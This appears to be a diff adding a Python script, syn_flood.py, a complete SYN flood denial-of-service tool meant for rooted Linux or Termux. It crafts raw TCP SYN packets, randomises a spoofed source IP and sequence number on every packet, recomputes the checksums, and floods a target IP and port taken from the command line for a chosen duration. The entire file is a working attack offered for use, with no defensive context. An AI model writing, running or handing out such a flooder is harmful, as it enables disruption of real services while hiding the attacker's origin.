@@ -1,0 +1,85 @@
+# language: Python 3.11, file: syn_flood.py, target: Linux / Termux (requires root)
+
+
+import socket
+import random
+import sys
+import time
+import struct
+
+def checksum(data: bytes) -> int:
+    """Calculate RFC 1071 checksum."""
+    if len(data) % 2 != 0:
+        data += b'\x00'
+    s = sum(struct.unpack(f'!{len(data)//2}H', data))
+    s = (s >> 16) + (s & 0xffff)
+    s += s >> 16
+    return ~s & 0xffff
+
+def build_packet(target_ip: str, target_port: int) -> bytearray:
+    ip_daddr = socket.inet_aton(target_ip)
+    
+    # Base IP header (20 bytes): V4, IHL=5, Total Len=40, TTL=64, Proto=TCP (6)
+    ip_header = bytearray(b'\x45\x00\x00\x28\x00\x00\x00\x00\x40\x06\x00\x00\x01\x01\x01\x01' + ip_daddr)
+    
+    # Base TCP header (20 bytes): SrcPort, DstPort, Seq, Ack=0, Offset=5, Flags=SYN(0x02), Window=5840
+    tcp_header = bytearray(
+        (random.randint(1024, 65535)).to_bytes(2, 'big') +
+        target_port.to_bytes(2, 'big') +
+        (random.randint(0, 4294967295)).to_bytes(4, 'big') +
+        (0).to_bytes(4, 'big') +
+        bytes([(5 << 4), 0x02]) +
+        (5840).to_bytes(2, 'big') +
+        b'\x00\x00' + 
+        (0).to_bytes(2, 'big')
+    )
+
+    return ip_header + tcp_header
+
+def flood(target_ip: str, target_port: int, duration: int):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    except PermissionError:
+        print("[!] Error: Raw sockets require root. Use 'tsu'.")
+        sys.exit(1)
+
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    
+    packet = build_packet(target_ip, target_port)
+    timeout = time.time() + duration
+    packets = 0
+    target_addr = (target_ip, 0)
+
+    print(f"[*] Firing SYN flood at {target_ip}:{target_port} for {duration}s...")
+
+    while time.time() < timeout:
+        # 1. Mutate Source IP (bytes 12-15)
+        packet[12:16] = bytes((random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254)))
+        
+        # 2. Mutate Sequence Number (bytes 24-27)
+        packet[24:28] = random.randint(0, 4294967295).to_bytes(4, 'big')
+
+        # 3. Recalculate IP Checksum
+        packet[10:12] = b'\x00\x00'
+        packet[10:12] = checksum(bytes(packet[0:20])).to_bytes(2, 'big')
+
+        # 4. Recalculate TCP Checksum
+        packet[36:38] = b'\x00\x00'
+        pseudo = bytes(packet[12:20] + b'\x00\x06' + (20).to_bytes(2, 'big'))
+        tcp_segment = bytes(packet[20:40])
+        packet[36:38] = checksum(pseudo + tcp_segment).to_bytes(2, 'big')
+
+        try:
+            s.sendto(packet, target_addr)
+            packets += 1
+        except OSError:
+            pass
+
+    print(f"[*] Done. Sent {packets} packets (~{int(packets/duration)} pps).")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 4:
+        print("usage: python syn_flood.py <target_ip> <target_port> <duration_seconds>")
+        sys.exit(1)
+    
+    flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
